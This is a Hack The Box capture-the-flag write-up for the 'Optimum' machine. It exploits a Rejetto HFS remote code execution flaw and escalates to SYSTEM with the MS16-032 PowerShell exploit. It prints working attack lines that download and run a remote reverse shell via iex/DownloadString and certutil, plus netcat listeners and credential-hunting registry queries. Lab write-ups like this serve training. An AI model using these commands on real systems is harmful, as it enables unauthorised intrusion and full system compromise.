# Optimum [HTB]()
![optimum-01]()


## Recon

I start by adding the target to `/etc/hosts` :

![hosts-02]()

From here i use `nmap` to scan the target:

```bash
nmap -sC -sV -A -p- optimum.htb -oN nmap.result
```

![nmap-res-03]()


We have a single port open, appears to be running an HTTP file server. Lets take a look at it.


### HFS Port 80


Lets open the site through our browsers at `http://optimum.htb`

![site-04]()


No files are hosted on the site at the moment. However, two things jump to my mind, the login link, and 
the version at the buttom. We could try to break the authintication logic, but if we hover over the 
version link we can see the file server is running `Rejetto`, which can also be seen from the page source:

![rejjeto-05]()

If we search Goolge for exploits we can find an RCE exploit from [ExploitDB](https://www.exploit-db.com/exploits/39161). The script looks like Python 2, it says we need to have a web server hosting `nc.exe`, 
and we need to setup a listener manually. Lets give it a shot. 

After i download the file, i update my local IP and port information:

![exploit-06]()

Now i grab a copy of `/usr/share/windows-resources/binaries/nc.exe` to my current working directory 
and start a Python web server with:

```bash
python3 -m http.server 80
```

I then start my listener with:

```bash
rlwrap nc -lnvp 443
```

Now we execute the exploit with:

```
python2 rejetto_rce.py optimum.htb 80
```

![shell-07]()

After a couple of executions i get a shell. First run it grabbed `nc.exe` from my server, second time 
it connected with the shell. 


## Privilege Escalation


If we try to catch quick wins by checking privs with:

```cmd
whoami /priv
```

We dont get anything useful. Or if we look for saved credentials with:

```cmd
cmdkey /list
```

Again, nothing there. 


Having a look at the user's home directory and `AppData` folder, nothing interesting comes up. 
No unusual software. No interesting config files. I also checked our user's group membership, nothing useful. 

If we try to open a PowerShell prompt with `powershell -ep bypass`, the shell connection freezes until 
we terminate it and re-execute the exploit. 

If we try to hunt for stored password in the registry with:

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
```

Nothing comes up. 


So i decided to generate `systeminfo` output and run [windows exploit suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) againts it. 


![sysinfo-08]()


We are up againts an X64 Windows 2012 R2 server. The exploit suggester returned quite a lot of potential 
kernel exploits. I tried a few, but they didnt work for me. 


So I decided to enumerate the system deeper, i tried finding lenient service permission with [accesschk64](https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk64.exe):


```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```


Nothing came up, so i tried to look for weak regitry ACL with:

```cmd
accesschk.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services
```

Nothing interesting came from that. I also tried running `WinPeas` but this froze the shell connection, 
and it appears the process gets hung and never terminitates. 

I tried looking at running services with:

```cmd
tasklist /SVC
```

Again, no leads came from that. I also tried looking at startup applications with:

```cmd
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
```

There were no startup tasks running as SYSTEM. 


At this point i decided to take a step back. I didnt find any third party software on the target, 
no misconfiguration of services, or file permissions. No saved credentials, no weak user privileges, 
no system tasks, no system services, Powershell freezes the connection, WinPEAS hangs indefinitely, 
what to do? 

Then i thought, this is a 2012 R2 server, the escalation must be a kernel exploit. So i went back to 
the `windows-exploit-suggester` output from before. I tried different exploits, and once again, nothing 
worked for me. i spent quite some time here.  

Primarly, i was interested in the `ms16-135` exploit, which is supposed to work for most x64-bit Windows
machines, which our target is. But instad, the exploit terminated saying, our machine's architecture was 32-bit. 

There was another exploit i tried a few times, `ms16-032`:

![exploit-suggester-09]()

Previously, i tried the `metasploit` version, this failed so i decided to move on. However this time, 
i found a PowerShell version of the exploit [here](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1). 


If we take a look at the source code, we can see we need to invoke the function and specify a command to run as SYSTEM:

![exploit-10]()

We can host nishang's reverse powershell script on a python server, setup a listener and run the exploit. 

First step, download the exploit to you kali, and invoke the funciton at the buttom:

![invoke-11]()

```powershell
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.42/rshell.ps1')"
```

Next, download [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell script to your kali.

Add the following line at the end of the script:

![nishang-12]()

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.42 -Port 9001
```

Now, from the target, download the exploit with:

```cmd
certutil -urlcache -f http://10.10.14.42/ms16-032.ps1 ms16-032.ps1
```

Setup the listener on you kali:

```bash
rlwrap -lnvp 9001
```

Then, use the 32-bit version of powershell to execute the exploit:

```cmd
C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe "C:\Users\kostas\Desktop\ms16-032.ps1"
```

This should give you a shell as the SYSTEM:

![root-13]()

